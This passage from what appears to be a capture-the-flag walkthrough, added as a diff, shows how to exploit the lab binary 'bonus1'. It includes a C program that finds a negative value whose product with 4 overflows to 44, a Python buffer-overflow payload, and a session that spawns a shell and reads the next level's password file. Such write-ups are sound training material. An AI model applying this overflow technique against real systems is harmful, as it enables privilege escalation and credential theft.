@@ -59,3 +59,54 @@ Continuing.
 # we're in
 process 22942 is executing new program: /bin/dash
 ```
+
+Now that we our payload works, let's get the value of n we need with the help
+of this little program:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int	main(int argc, char **argv)
+{
+	int	n = 0;
+
+	if (argc > 1)
+		n = atoi(argv[1]);
+	else
+		for (n = -1; n < 0 && n * 4 != 44; --n);
+	printf("%d * 4 = %d\n", n, n * 4);
+	return (0);
+}
+```
+
+It will simply loop on negative values starting with -1 (which way too high by
+the way, since it will not undflow untin at least INT32\_MAX/4, but who cares?)
+and stop when it finds a negative value that multiplied by 4 will overflow to
+44, which is the number of bytes we want to write to change _n_'s value.
+
+```shell
+# compile the program
+gcc underflow.c
+# run it
+./a.out
+-1073741813 * 4 = 44
+```
+
+And there we go. A value that will both pass the first test and make it so the
+payload is written as it should.
+
+```shell
+# set the arguments
+N=-1073741813
+PAYLOAD=$(python -c 'print "a" * 40 + "\x57\x4f\x4c\x46"[::-1]')
+# run the program
+./bonus1 $N $PAYLOAD
+# enjoy your shell
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+And we're done!
